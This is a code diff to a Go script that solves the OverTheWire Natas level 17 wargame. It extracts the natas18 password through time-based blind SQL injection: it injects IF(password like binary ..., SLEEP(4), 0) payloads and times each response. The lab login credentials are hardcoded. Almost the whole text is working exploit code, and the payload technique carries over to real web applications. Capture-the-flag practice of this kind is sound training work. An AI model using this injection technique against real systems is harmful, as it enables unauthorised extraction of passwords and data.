@@ -13,15 +13,16 @@ func main() {
 	for {
 		error := false
 
-		for i, abc := range arr {
+		for _, abc := range arr {
 			fmt.Print(abc)
 			if result(pass + abc) {
 				pass = pass + abc
-				fmt.Println("\n" + pass + "\n")
+				fmt.Print("\n", len(pass), "\t", pass, "\n\n")
 				break
 			}
-			if i == len(arr)-1 {
+			if abc == "z" {
 				error = true
+				break
 			}
 		}
 
@@ -32,8 +33,6 @@ func main() {
 	}
 
 	fmt.Println("\nLa password è: ", pass)
-	//pass := "a%"
-
 }
 
 //SQL Injection time based
@@ -42,8 +41,7 @@ func result(pass string) bool {
 	usr := "natas17"
 	psw := "8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw"
 	baseURL := "http://" + usr + ".natas.labs.overthewire.org"
-	//query := "?debug=0&username=natas18\"%20and%20password%20like%20binary%20\"" + pass + "%"
-	query := "?debug=0&username=natas18\"%20and%20IF(password%20like%20binary%20\"" + pass + "%\",SLEEP(5),0)%20%23"
+	query := "?debug=0&username=natas18\"%20and%20IF(password%20like%20binary%20\"" + pass + "%\",SLEEP(4),0)%20%23"
 
 	client := &http.Client{}
 	req, _ := http.NewRequest("GET",
@@ -61,6 +59,7 @@ func result(pass string) bool {
 
 		fmt.Println(bs)
 	*/
+
 	if ellapsed.Seconds() > 4 {
 		fmt.Print("\t", ellapsed.Seconds())
 		return true
